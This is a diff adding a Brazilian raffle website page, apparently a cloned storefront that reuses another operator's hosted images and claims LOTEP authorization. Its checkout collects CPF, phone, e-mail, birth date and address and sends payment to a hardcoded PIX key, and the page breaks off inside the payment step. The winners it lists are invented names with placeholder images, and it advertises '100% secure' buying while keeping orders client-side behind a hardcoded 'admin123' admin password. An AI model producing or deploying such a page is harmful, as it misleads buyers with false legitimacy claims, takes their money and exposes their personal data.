@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gêmeos Brasil</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Montserrat', sans-serif; background:#f1f1f1; color:#171717; padding:0 0 20px 0; min-height:100vh; }
+        a { text-decoration:none; color:inherit; }
+        .container { max-width:480px; margin:0 auto; padding:0 16px; }
+        .btn { display:inline-block; border:none; cursor:pointer; font-weight:600; transition:.2s; }
+        .btn-success { background:#00307a; color:#fff; }
+        .btn-success:hover { background:#002a6a; }
+        .bg-primary { background:#00307a; }
+        .text-primary { color:#00307a; }
+        .text-white { color:#fff; }
+        .text-muted { color:#666; }
+        .font-weight-600 { font-weight:600; }
+        .font-weight-700 { font-weight:700; }
+        .font-xss { font-size:12px; }
+        .font-xs { font-size:13px; }
+        .font-sm { font-size:14px; }
+        .font-md { font-size:16px; }
+        .font-lg { font-size:18px; }
+        .font-xl { font-size:22px; }
+        .rounded-10 { border-radius:10px; }
+        .rounded-12 { border-radius:12px; }
+        .rounded-16 { border-radius:16px; }
+        .shadow-sm { box-shadow:0 2px 8px rgba(0,0,0,0.08); }
+        .shadow-md { box-shadow:0 4px 16px rgba(0,0,0,0.10); }
+        .w-100 { width:100%; }
+        .d-flex { display:flex; }
+        .align-items-center { align-items:center; }
+        .justify-content-between { justify-content:space-between; }
+        .justify-content-center { justify-content:center; }
+        .flex-column { flex-direction:column; }
+        .gap-1 { gap:8px; }
+        .gap-2 { gap:12px; }
+        .gap-3 { gap:16px; }
+        .text-center { text-align:center; }
+        .text-end { text-align:right; }
+        .mt-1 { margin-top:8px; }
+        .mt-2 { margin-top:16px; }
+        .mt-3 { margin-top:24px; }
+        .mb-1 { margin-bottom:8px; }
+        .mb-2 { margin-bottom:16px; }
+        .mb-3 { margin-bottom:24px; }
+        .p-1 { padding:8px; }
+        .p-2 { padding:16px; }
+        .p-3 { padding:24px; }
+        .py-1 { padding-top:8px; padding-bottom:8px; }
+        .py-2 { padding-top:16px; padding-bottom:16px; }
+        .px-1 { padding-left:8px; padding-right:8px; }
+        .px-2 { padding-left:16px; padding-right:16px; }
+        .opacity-75 { opacity:0.75; }
+        .pointer { cursor:pointer; }
+
+        .app-header { background:#00307a; color:#fff; padding:12px 0; position:sticky; top:0; z-index:100; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
+        .app-header .container { display:flex; justify-content:space-between; align-items:center; }
+        .app-header .logo img { height:40px; width:auto; }
+        .app-header .menu-btn { font-size:24px; color:#fff; background:none; border:none; cursor:pointer; padding:4px 8px; }
+        .app-header .suporte { font-size:12px; color:#fff; opacity:0.7; text-align:right; }
+        .app-header .suporte i { font-size:20px; display:block; margin-bottom:2px; }
+
+        .nav-horizontal { background:#00307a; border-top:1px solid rgba(255,255,255,0.1); padding:8px 0; }
+        .nav-horizontal ul { display:flex; list-style:none; gap:24px; padding:0 16px; margin:0; }
+        .nav-horizontal ul li a { color:rgba(255,255,255,0.7); font-size:13px; font-weight:500; display:flex; align-items:center; gap:6px; padding:4px 0; border-bottom:2px solid transparent; transition:.2s; }
+        .nav-horizontal ul li a.active { color:#fff; border-bottom-color:#fff; }
+        .nav-horizontal ul li a i { font-size:14px; }
+
+        .app-title { padding:16px 0 8px; }
+        .app-title h1 { font-size:20px; font-weight:700; color:#00307a; margin:0; }
+        .app-title .desc { font-size:13px; color:#888; }
+
+        .card-sorteio { background:#fff; border-radius:16px; box-shadow:0 2px 12px rgba(0,0,0,0.06); overflow:hidden; margin-bottom:16px; transition:.2s; }
+        .card-sorteio .img-wrap { position:relative; width:100%; padding-top:48%; overflow:hidden; }
+        .card-sorteio .img-wrap img { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; }
+        .card-sorteio .badge-status { position:absolute; top:12px; left:12px; background:#28a745; color:#fff; font-size:11px; font-weight:600; padding:4px 14px; border-radius:30px; }
+        .card-sorteio .badge-codigo { position:absolute; bottom:12px; left:12px; background:rgba(0,0,0,0.6); color:#fff; font-size:10px; font-weight:600; padding:4px 12px; border-radius:30px; letter-spacing:0.5px; }
+        .card-sorteio .info { padding:16px; }
+        .card-sorteio .info h2 { font-size:15px; font-weight:700; color:#00307a; margin:0 0 4px; line-height:1.3; }
+        .card-sorteio .info .desc { font-size:13px; color:#555; margin-bottom:12px; }
+        .card-sorteio .btn-comprar { background:#28a745; color:#fff; font-weight:600; font-size:14px; padding:12px 20px; border-radius:50px; display:flex; align-items:center; justify-content:center; gap:10px; width:100%; border:none; transition:.2s; }
+        .card-sorteio .btn-comprar:hover { background:#218838; }
+        .card-sorteio .btn-comprar i { font-size:18px; }
+        .card-sorteio .btn-comprar .sub { font-size:11px; font-weight:400; opacity:0.8; }
+        .card-sorteio .pacotes { display:flex; flex-wrap:wrap; gap:8px; margin:10px 0 0; }
+        .card-sorteio .pacotes .pqt-btn { background:#f1f1f1; border:1px solid #ddd; padding:6px 14px; border-radius:30px; font-weight:600; font-size:12px; color:#00307a; cursor:pointer; transition:.2s; }
+        .card-sorteio .pacotes .pqt-btn:hover { background:#00307a; color:#fff; border-color:#00307a; }
+        .card-sorteio .pacotes .pqt-btn.selected { background:#00307a; color:#fff; border-color:#00307a; }
+
+        .card-sorteio-mini { background:#fff; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.05); padding:12px 14px; margin-bottom:12px; display:flex; align-items:center; gap:14px; transition:.2s; }
+        .card-sorteio-mini:hover { box-shadow:0 4px 16px rgba(0,0,0,0.08); }
+        .card-sorteio-mini .img-mini { width:70px; height:70px; border-radius:10px; object-fit:cover; flex-shrink:0; background:#eee; }
+        .card-sorteio-mini .info-mini { flex:1; min-width:0; }
+        .card-sorteio-mini .info-mini .badge-status { font-size:10px; font-weight:600; padding:2px 12px; border-radius:30px; display:inline-block; }
+        .card-sorteio-mini .info-mini .badge-status.ativo { background:#28a745; color:#fff; }
+        .card-sorteio-mini .info-mini .badge-status.concluido { background:#00307a; color:#fff; }
+        .card-sorteio-mini .info-mini .codigo { font-size:10px; color:#999; font-weight:600; letter-spacing:0.3px; }
+        .card-sorteio-mini .info-mini .titulo { font-size:14px; font-weight:600; color:#00307a; margin:2px 0; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .card-sorteio-mini .info-mini .desc { font-size:12px; color:#666; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .card-sorteio-mini .info-mini .pacotes-mini { display:flex; flex-wrap:wrap; gap:4px; margin-top:6px; }
+        .card-sorteio-mini .info-mini .pacotes-mini .pqt-btn-mini { background:#00307a; color:#fff; border:none; padding:2px 10px; border-radius:30px; font-weight:600; font-size:11px; cursor:pointer; transition:.2s; }
+        .card-sorteio-mini .info-mini .pacotes-mini .pqt-btn-mini:hover { background:#002a6a; }
+
+        .winners-scroller { display:flex; gap:12px; overflow-x:auto; padding:8px 0 16px; scroll-snap-type:x mandatory; -webkit-overflow-scrolling:touch; }
+        .winners-scroller .card-winner { flex:0 0 140px; background:#fff; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.05); overflow:hidden; scroll-snap-align:start; }
+        .winners-scroller .card-winner .img-winner { width:100%; height:90px; background:#eee; object-fit:cover; }
+        .winners-scroller .card-winner .info-winner { padding:10px 12px; }
+        .winners-scroller .card-winner .info-winner .name { font-size:13px; font-weight:600; color:#00307a; }
+        .winners-scroller .card-winner .info-winner .prize { font-size:11px; color:#888; }
+
+        .faq-item { background:#fff; border-radius:10px; box-shadow:0 2px 8px rgba(0,0,0,0.05); margin-bottom:10px; overflow:hidden; }
+        .faq-item .question { padding:14px 16px; font-weight:600; font-size:14px; color:#00307a; cursor:pointer; display:flex; justify-content:space-between; align-items:center; transition:.2s; }
+        .faq-item .question i { transition:.2s; }
+        .faq-item .question.open i { transform:rotate(90deg); }
+        .faq-item .answer { padding:0 16px 16px; font-size:13px; color:#666; line-height:1.6; display:none; }
+        .faq-item .answer.open { display:block; }
+
+        .app-footer { background:#fff; border-top:1px solid #eee; padding:20px 0; margin-top:20px; font-size:12px; color:#888; text-align:center; line-height:1.8; }
+        .app-footer .lotep { display:flex; justify-content:center; align-items:center; gap:8px; margin:8px 0; }
+        .app-footer .lotep img { height:36px; }
+        .app-footer .age-badge { display:inline-flex; align-items:center; gap:6px; background:#f1f1f1; padding:4px 16px; border-radius:30px; font-weight:600; font-size:13px; color:#00307a; margin-bottom:12px; }
+        .app-footer .age-badge span { background:#00307a; color:#fff; padding:2px 8px; border-radius:30px; font-size:12px; }
+
+        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); backdrop-filter:blur(4px); z-index:999; justify-content:center; align-items:center; padding:20px; }
+        .modal-overlay.active { display:flex; }
+        .modal-box { background:#fff; border-radius:20px; max-width:460px; width:100%; max-height:95vh; overflow-y:auto; padding:24px 20px; box-shadow:0 20px 60px rgba(0,0,0,0.3); position:relative; }
+        .modal-box .close-modal { position:absolute; top:12px; right:16px; font-size:24px; color:#999; cursor:pointer; background:none; border:none; }
+        .modal-box .close-modal:hover { color:#333; }
+        .modal-box h2 { font-size:20px; font-weight:700; color:#00307a; margin-bottom:4px; }
+        .modal-box .sub { color:#888; font-size:14px; margin-bottom:16px; }
+        .modal-box .detail { background:#f8f8f8; padding:12px 16px; border-radius:12px; display:flex; justify-content:space-between; margin:8px 0 16px; font-size:14px; }
+        .modal-box .detail .label { color:#888; }
+        .modal-box .detail .value { font-weight:700; color:#00307a; }
+        .modal-box input { width:100%; padding:14px 16px; border:1px solid #ddd; border-radius:12px; font-size:16px; margin:6px 0; background:#fff; color:#333; }
+        .modal-box input:focus { outline:none; border-color:#00307a; box-shadow:0 0 0 3px rgba(0,48,122,0.1); }
+        .modal-box .btn-primary { background:#00307a; color:#fff; font-weight:700; font-size:17px; padding:16px; border-radius:50px; width:100%; border:none; cursor:pointer; transition:.2s; margin-top:12px; }
+        .modal-box .btn-primary:hover { background:#002a6a; }
+        .modal-box .btn-secondary { background:#f1f1f1; color:#333; font-weight:600; font-size:15px; padding:12px; border-radius:50px; width:100%; border:1px solid #ddd; cursor:pointer; transition:.2s; margin-top:8px; }
+        .modal-box .btn-secondary:hover { background:#e0e0e0; }
+        .modal-box .secure-badge { text-align:center; color:#4caf50; font-size:13px; margin-top:14px; }
+        .modal-box .secure-badge i { margin-right:4px; }
+        .modal-box .pix-area { background:#f8f8f8; border:1px dashed #00307a; border-radius:16px; padding:20px; margin:16px 0; text-align:center; }
+        .modal-box .pix-area .pix-key { font-weight:700; font-size:18px; color:#00307a; word-break:break-all; background:#fff; padding:12px; border-radius:10px; border:1px solid #ddd; margin:10px 0; }
+        .modal-box .pix-area .btn-copy { background:#fff; border:1px solid #00307a; padding:8px 24px; border-radius:30px; color:#00307a; font-weight:600; cursor:pointer; transition:.2s; }
+        .modal-box .pix-area .btn-copy:hover { background:#00307a; color:#fff; }
+        .modal-box .timer { font-size:32px; font-weight:800; color:#00307a; text-align:center; margin:8px 0; }
+        .modal-box .timer-label { text-align:center; color:#888; font-size:14px; }
+        .modal-box .warning { color:#d32f2f; font-size:13px; margin:8px 0; }
+        .modal-box .success { color:#2e7d32; font-size:13px; }
+        .modal-box .cota-list { display:flex; flex-wrap:wrap; gap:6px; justify-content:center; margin:10px 0; }
+        .modal-box .cota-item { background:#00307a; color:#fff; padding:4px 12px; border-radius:30px; font-weight:600; font-size:13px; }
+
+        .checkbox-group { display:flex; align-items:flex-start; gap:10px; margin:10px 0; font-size:13px; color:#555; }
+        .checkbox-group input { width:18px; height:18px; margin-top:2px; accent-color:#00307a; flex-shrink:0; }
+
+        @media (max-width:480px) { .card-sorteio .info h2 { font-size:14px; } .card-sorteio-mini .info-mini .titulo { font-size:13px; } .card-sorteio-mini .img-mini { width:60px; height:60px; } }
+    </style>
+</head>
+<body>
+
+<header class="app-header">
+    <div class="container">
+        <button class="menu-btn" onclick="toggleMenu()"><i class="bi bi-filter-left"></i></button>
+        <div class="logo"><img src="https://incs-bucket.s3.amazonaws.com/20251006_68e46920323ee.png" alt="Gêmeos Brasil"></div>
+        <div class="suporte"><i class="bi bi-chat-right-dots-fill"></i><span>Suporte</span></div>
+    </div>
+    <div class="nav-horizontal">
+        <ul>
+            <li><a href="#" class="active"><i class="bi bi-stars"></i> Campanhas</a></li>
+            <li><a href="#" onclick="alert('Funcionalidade em desenvolvimento')">Meus títulos</a></li>
+        </ul>
+    </div>
+</header>
+
+<main class="container">
+    <div class="app-title">
+        <h1>⚡ Campanhas</h1>
+        <div class="desc">Escolha sua sorte</div>
+    </div>
+
+    <!-- Card destaque com pacotes -->
+    <div class="card-sorteio">
+        <div class="img-wrap">
+            <img src="https://s3.incrivelsorteios.com/redimensiona?key=600x600/20260901_6a972132a61b0.jpeg" alt="Edição 597">
+            <span class="badge-status">Aguarde o sorteio</span>
+            <span class="badge-codigo"><b>GIROS_LTPUMMILHAO_002/597</b></span>
+        </div>
+        <div class="info">
+            <h2>EDIÇÃO 597 - 4x HONDA CG 160 FAN 2026 + 1x VW T CROSS SENSE TSI AD 2020 + 1x VW T CROSS TSI AD 2020 + 1x VW T CROSS SENSE TSI AD 2020 + 1x VW T CROSS TSI ADA 2021</h2>
+            <div class="desc">4x HONDA CG 160 FAN 2026 + 1x VW T CROSS SENSE TSI AD 2020 + 1x VW T CROSS TSI AD 2020 + 1x VW T CROSS SENSE TSI AD 2020 + 1x VW T CROSS TSI ADA 2021</div>
+            <!-- Pacotes de cotas -->
+            <div class="pacotes" id="pacotesDestaque">
+                <button class="pqt-btn selected" data-qty="4" onclick="selectPacoteDestaque(4)">4</button>
+                <button class="pqt-btn" data-qty="20" onclick="selectPacoteDestaque(20)">+20</button>
+                <button class="pqt-btn" data-qty="30" onclick="selectPacoteDestaque(30)">+30</button>
+                <button class="pqt-btn" data-qty="50" onclick="selectPacoteDestaque(50)">+50</button>
+                <button class="pqt-btn" data-qty="70" onclick="selectPacoteDestaque(70)">+70</button>
+                <button class="pqt-btn" data-qty="100" onclick="selectPacoteDestaque(100)">+100</button>
+            </div>
+            <button class="btn-comprar" onclick="startCheckoutDestaque()">
+                <i class="bi bi-arrow-right-circle-fill"></i>
+                <span>Garantir meus números <span class="sub">Compra segura e rápida</span></span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Ganhadores -->
+    <div style="margin:20px 0 12px;">
+        <div class="app-title" style="padding:0;">
+            <h1>🎉 Ganhadores recentes</h1>
+            <div class="desc">Veja alguns dos premiados mais recentes da plataforma.</div>
+        </div>
+        <div class="winners-scroller">
+            <div class="card-winner">
+                <img class="img-winner" src="https://via.placeholder.com/140x90/eee/00307a?text=Ganhador" alt="Ganhador">
+                <div class="info-winner"><div class="name">João Silva</div><div class="prize">Honda CG 160</div></div>
+            </div>
+            <div class="card-winner">
+                <img class="img-winner" src="https://via.placeholder.com/140x90/eee/00307a?text=Ganhador" alt="Ganhador">
+                <div class="info-winner"><div class="name">Maria Santos</div><div class="prize">VW Saveiro</div></div>
+            </div>
+            <div class="card-winner">
+                <img class="img-winner" src="https://via.placeholder.com/140x90/eee/00307a?text=Ganhador" alt="Ganhador">
+                <div class="info-winner"><div class="name">Carlos Lima</div><div class="prize">Jetski Sea-Doo</div></div>
+            </div>
+            <div class="card-winner">
+                <img class="img-winner" src="https://via.placeholder.com/140x90/eee/00307a?text=Ganhador" alt="Ganhador">
+                <div class="info-winner"><div class="name">Ana Pereira</div><div class="prize">Toyota Corolla</div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lista de campanhas (mini) com pacotes -->
+    <div id="campanhasList"></div>
+
+    <!-- FAQ -->
+    <div style="margin:24px 0 12px;">
+        <div class="app-title" style="padding:0;">
+            <h1>🤷 Perguntas frequentes</h1>
+        </div>
+        <div id="faqContainer"></div>
+    </div>
+
+    <!-- Admin -->
+    <div style="text-align:center; margin:20px 0;">
+        <button onclick="showAdminLogin()" style="background:transparent; border:1px solid #00307a; color:#00307a; padding:6px 20px; border-radius:30px; font-weight:600; font-size:12px; cursor:pointer;">
+            <i class="bi bi-lock"></i> Admin
+        </button>
+    </div>
+</main>
+
+<footer class="app-footer">
+    <div class="container">
+        <div class="age-badge"><span>18+</span> Permitido para maiores de 18 anos</div>
+        <div class="lotep">
+            <img src="https://incs-bucket.s3.amazonaws.com/entidades/lotep.png" alt="LOTEP">
+            <span style="font-weight:600; color:#00307a;">LOTEP – A PARAÍBA TEM SORTE</span>
+        </div>
+        <p style="font-size:11px; color:#999; max-width:400px; margin:8px auto;">
+            Este bilhete de loteria está autorizado com base no termo de autorização descrito no regulamento da promoção. Antes de contratar, consulte o Regulamento do produto. É proibida a venda para menores de 18 anos.
+        </p>
+        <p style="margin-top:12px; font-size:11px; color:#aaa;">2026 Gêmeos Brasil © - Todos os direitos reservados.</p>
+    </div>
+</footer>
+
+<!-- Modais -->
+<div class="modal-overlay" id="modalCheckout"><div class="modal-box"><button class="close-modal" onclick="closeModal()"><i class="bi bi-x-lg"></i></button><div id="modalContent"></div></div></div>
+<div class="modal-overlay" id="modalAdmin"><div class="modal-box" style="max-width:380px;"><button class="close-modal" onclick="closeAdmin()"><i class="bi bi-x-lg"></i></button><h2>🔐 Painel Administrativo</h2><input type="password" id="adminPass" placeholder="Senha" style="margin-top:12px;"><button class="btn-primary" onclick="adminLogin()">Entrar</button><div id="adminError" style="color:#d32f2f; margin-top:8px; font-size:14px;"></div></div></div>
+<div class="modal-overlay" id="modalDashboard"><div class="modal-box" style="max-width:520px;"><button class="close-modal" onclick="closeDashboard()"><i class="bi bi-x-lg"></i></button><div style="display:flex; justify-content:space-between; align-items:center;"><h2>📊 Pedidos</h2><button onclick="logoutAdmin()" style="background:#f1f1f1; border:1px solid #ddd; padding:4px 16px; border-radius:30px; font-weight:600; font-size:12px; cursor:pointer;">Sair</button></div><div id="ordersList" style="margin-top:16px; max-height:60vh; overflow-y:auto;"><p style="color:#888;">Carregando...</p></div></div></div>
+
+<script>
+    // ===== CONFIG =====
+    const CONFIG = { pixKey: 'dc32316a-e08c-49e1-84d7-b67c54623279', adminPassword: 'admin123', pricePerUnit: 0.79, totalNumbers: 600 };
+
+    // ===== CAMPANHAS =====
+    const campanhas = [
+        { id:'600', titulo:'EDIÇÃO 600 - JETSKI + VW/SAVEIRO 2027', descricao:'JETSKI + VW/SAVEIRO 2027', codigo:'GIROS_LTPUMMILHAO_002/600', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260904_6a9b2f1143c13.jpeg', status:'Adquira já!', classe:'ativo', valor:0.79 },
+        { id:'602', titulo:'EDIÇÃO 602 - 1x HONDA CG 160 FAN', descricao:'1x HONDA CG 160 FAN 2026', codigo:'GIROS_LTPUMMILHAO_002/602', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260906_6a9dca193112c.jpeg', status:'Aguarde o sorteio', classe:'ativo', valor:0.05 },
+        { id:'603', titulo:'EDIÇÃO 603 - 3x HONDA CG 160 TITAN 2026', descricao:'3x HONDA CG 160 TITAN 2026', codigo:'GIROS_LTPUMMILHAO_002/603', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260907_6a9ec4e277751.jpeg', status:'Adquira já!', classe:'ativo', valor:0.15 },
+        { id:'601', titulo:'EDIÇÃO 601 - HONDA NXR 160 BROS CBS 2026', descricao:'1x HONDA NXR 160 BROS CBS 2026', codigo:'GIROS_LTPUMMILHAO_002/601', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260905_6a9c935b58fce.jpg', status:'Concluído', classe:'concluido', valor:0.07 },
+        { id:'599', titulo:'EDIÇÃO 599 - 3x HONDA CG 160 FAN', descricao:'3x HONDA CG 160 FAN 2026', codigo:'GIROS_LTPUMMILHAO_002/599', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260904_6a9ab060365bb.jpeg', status:'Concluído', classe:'concluido', valor:0.15 },
+        { id:'598', titulo:'EDIÇÃO 598 - CB 300F TWISTER CBS 2026', descricao:'1x CB 300F TWISTER CBS 2026', codigo:'GIROS_LTPUMMILHAO_002/598', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260903_6a9974a2d9594.jpeg', status:'Concluído', classe:'concluido', valor:0.07 },
+        { id:'596', titulo:'EDIÇÃO 596 - CEGONHA MILIONÁRIA', descricao:'IVECO/TECTOR 2022 + TOYOTA COROLLA XEI 2023 + ...', codigo:'GIROS_LTPUMMILHAO_002/596', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260830_6a944555c5deb.jpeg', status:'Concluído', classe:'concluido', valor:2.99 },
+        { id:'594', titulo:'EDIÇÃO 594 - TOYOTA HILUX CDSR 2018', descricao:'1x TOYOTA HILUX CDSR A2GF 2018', codigo:'GIROS_LTPUMMILHAO_002/594', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260828_6a9182d071407.jpeg', status:'Concluído', classe:'concluido', valor:0.45 },
+        { id:'595', titulo:'EDIÇÃO 595 - 2x HONDA BIZ 125 EX', descricao:'2x HONDA BIZ 125 EX 2027', codigo:'GIROS_LTPUMMILHAO_002/595', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260829_6a92db8b5092c.jpeg', status:'Concluído', classe:'concluido', valor:0.10 },
+        { id:'592', titulo:'EDIÇÃO 592 - TOYOTA COROLLA CROSS XRE + TOYOTA COROLLA XEI + 2x HONDA CG 160 TITAN', descricao:'1x TOYOTA COROLLA CROSS XRE 2022 + 1x TOYOTA COROLLA XEI 2023 + 2x HONDA CG 160 TITAN 2026', codigo:'GIROS_LTPUMMILHAO_002/592', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260827_6a902e6aa5a4a.jpeg', status:'Concluído', classe:'concluido', valor:0.99 },
+        { id:'590', titulo:'EDIÇÃO 590 - 3x HONDA CG 160 FAN 2026', descricao:'3x HONDA CG 160 FAN 2026', codigo:'GIROS_LTPUMMILHAO_002/590', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260826_6a8ed5abbfcc6.jpeg', status:'Concluído', classe:'concluido', valor:0.15 },
+        { id:'593', titulo:'EDIÇÃO 593 - VW/VIRTUS', descricao:'1x VW/VIRTUS 2020', codigo:'GIROS_LTPUMMILHAO_002/593', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260827_6a904bd538ae1.jpeg', status:'Concluído', classe:'concluido', valor:0.18 },
+        { id:'587', titulo:'EDIÇÃO 587 - CB 300F TWISTER CBS 2026', descricao:'1x CB 300F TWISTER CBS 2026', codigo:'GIROS_LTPUMMILHAO_002/587', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260824_6a8c3585ed08c.jpeg', status:'Concluído', classe:'concluido', valor:0.07 },
+        { id:'591', titulo:'EDIÇÃO 591 - 1x VW SAVEIRO CE CROSS MA 2017 + 1x HONDA CG 160 TITAN 2026', descricao:'1x VW SAVEIRO CE CROSS MA 2017 + 1x HONDA CG 160 TITAN 2026', codigo:'GIROS_LTPUMMILHAO_002/591', img:'https://s3.incrivelsorteios.com/redimensiona?key=150x150/20260826_6a8edc12ed5a0.jpeg', status:'Concluído', classe:'concluido', valor:0.29 }
+    ];
+
+    const faqs = [
+        { pergunta:'Como é o processo do sorteio?', resposta:'Sorteio será realizado com base na extração da Loteria Federal, conforme Condições de Participação constantes no título.' },
+        { pergunta:'Como o prêmio será entregue?', resposta:'Não há necessidade de se preocupar com os trâmites relacionados à entrega do prêmio, pois nós cuidaremos de tudo.' },
+        { pergunta:'Onde encontro minhas compras?', resposta:'Existem duas formas de você conseguir acessar suas compras, a primeira é logando no site, abrindo o menu do site e clicando em "Entrar" e a segunda forma é visitando a campanha e clicando em "Compras" logo a baixo do nome "Chances".' },
+        { pergunta:'Quem são os ganhadores?', resposta:'Para visualizar os ganhadores, acesse o menu e clique em GANHADORES (ícone de 3 linhas no canto superior direito > ganhadores).' }
+    ];
+
+    // ===== VARIÁVEIS DE CHECKOUT =====
+    let selectedQty = 4;
+    let currentCampanha = null;
+    let selectedNumbers = [];
+    let timerInterval = null;
+    let currentOrderId = null;
+    let destaqueQty = 4; // quantidade selecionada no card destaque
+
+    // ===== SELEÇÃO DE PACOTES (destaque) =====
+    function selectPacoteDestaque(qty) {
+        destaqueQty = qty;
+        document.querySelectorAll('#pacotesDestaque .pqt-btn').forEach(b => b.classList.remove('selected'));
+        document.querySelector(`#pacotesDestaque .pqt-btn[data-qty="${qty}"]`).classList.add('selected');
+    }
+
+    function startCheckoutDestaque() {
+        const titulo = 'EDIÇÃO 597 - 4x HONDA CG 160 FAN 2026 + VW T-CROSS';
+        const valor = 1.20;
+        const totalNumeros = 10000;
+        startCheckout('597', titulo, valor, totalNumeros, destaqueQty);
+    }
+
+    // ===== INICIALIZAR CHECKOUT =====
+    function startCheckout(id, titulo, valor, totalNumeros, qty) {
+        currentCampanha = { id, titulo, valor, totalNumeros };
+        selectedQty = qty || 4;
+        selectedNumbers = generateUniqueNumbers(selectedQty);
+        showStep('phone');
+    }
+
+    // ===== GERAR NÚMEROS ÚNICOS =====
+    function generateUniqueNumbers(qty) {
+        const orders = getOrders();
+        const used = new Set();
+        orders.forEach(o => { if (o.numbers) o.numbers.forEach(n => used.add(n)); });
+        const available = [];
+        let attempts = 0;
+        while (available.length < qty && attempts < 10000) {
+            attempts++;
+            const num = Math.floor(Math.random() * 900000) + 100000;
+            if (!used.has(num) && !available.includes(num)) available.push(num);
+        }
+        return available;
+    }
+
+    // ===== EXIBIR ETAPAS DO CHECKOUT =====
+    function showStep(step) {
+        const modal = document.getElementById('modalCheckout');
+        modal.classList.add('active');
+        const content = document.getElementById('modalContent');
+        const total = (selectedNumbers.length * currentCampanha.valor).toFixed(2);
+
+        if (step === 'phone') {
+            content.innerHTML = `
+                <h2>Checkout</h2>
+                <div class="sub">VOCÊ ESTÁ ADQUIRINDO</div>
+                <div style="font-weight:700; color:#00307a; font-size:15px;">${currentCampanha.titulo}</div>
+                <div class="detail">
+                    <span class="label">${selectedNumbers.length} unidades</span>
+                    <span class="value">R$ ${total}</span>
+                </div>
+                <p style="color:#888; font-size:14px; margin:8px 0;">Informe seu telefone para continuar.</p>
+                <input type="tel" id="phoneInput" placeholder="(82) 99116-6032" value="(82) 99116-6032">
+                <button class="btn-primary" onclick="goToData()">Continuar →</button>
+                <div class="secure-badge"><i class="bi bi-lock-fill"></i> COMPRA 100% SEGURA</div>
+            `;
+        } else if (step === 'data') {
+            content.innerHTML = `
+                <h2>Checkout</h2>
+                <div class="sub">VOCÊ ESTÁ ADQUIRINDO</div>
+                <div style="font-weight:700; color:#00307a; font-size:15px;">${currentCampanha.titulo}</div>
+                <div class="detail">
+                    <span class="label">${selectedNumbers.length} unidades</span>
+                    <span class="value">R$ ${total}</span>
+                </div>
+                <input type="text" id="fullName" placeholder="Nome completo" value="João Silva">
+                <input type="text" id="socialName" placeholder="Informar o nome social (opcional)">
+                <input type="email" id="email" placeholder="E-mail" value="joao@email.com">
+                <input type="tel" id="cellphone" placeholder="Celular" value="(82) 99116-6032">
+                <input type="tel" id="confirmCell" placeholder="Confirme o celular" value="(82) 99116-6032">
+                <input type="date" id="birthDate" placeholder="Data de Nascimento" value="1990-01-01">
+                <input type="text" id="cpf" placeholder="CPF" value="12345678900" maxlength="11">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="addressCheck" onchange="toggleAddress()">
+                    <label for="addressCheck">Desejo informar o meu endereço</label>
+                </div>
+                <div id="addressFields" style="display:none;">
+                    <input type="text" id="cep" placeholder="CEP">
+                    <input type="text" id="street" placeholder="Rua">
+                    <input type="text" id="number" placeholder="Número">
+                    <input type="text" id="complement" placeholder="Complemento">
+                    <input type="text" id="neighborhood" placeholder="Bairro">
+                    <input type="text" id="city" placeholder="Cidade">
+                    <input type="text" id="state" placeholder="Estado">
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="termsCheck">
+                    <label for="termsCheck" style="font-size:12px;">Ao realizar este pagamento e confirmar minha compra desse título de capitalização, declaro ter lido e concordado com os termos desta anexados na página do sorteio.</label>
+                </div>
+                <button class="btn-primary" onclick="finalizeOrder()">Concluir cadastro e pagar</button>
+                <div style="text-align:center; margin-top:10px; color:#00307a; font-size:14px; cursor:pointer;" onclick="alert('Funcionalidade de login não implementada')">Já possuo uma conta</div>
+                <div class="secure-badge"><i class="bi bi-lock-fill"></i> COMPRA 100% SEGURA</div>
+            `;
+        } else if (step === 'payment') {
+            const numbersStr = selectedNumbers.join(' - ');
+            content.innerHTML = `
+                <h2 style="text-align:center;">Aguardando pagamento!</h2>
+                <div style="text-align:center; color:#888; font-size:14px;">Finalize</div>
+                <div style="text-align:center; color:#999; font-size:13px;">${new Date().toLocaleString()}</div>
+                <div class="timer" id="timerDisplay">09:39</div>
+                <div class="timer-label">Você tem <strong id="timerLabel" style="color:#00307a;">09:39</strong> para pagar</div>
+                <div style="text-align:center; margin:8px 0; font-size:14px; color:#888;">
+                    Suas cotas: <span style="color:#00307a; font-weight:700;">${numbersStr}</span>
+                </div>
+                <div class="pix-area">
+                    <div style="text-align:left; color:#888; font-size:14px; margin-bottom:8px;"><i class="bi bi-1-circle-fill" style="color:#00307a;"></i> Copie e cole no app do banco para pagar.</div>
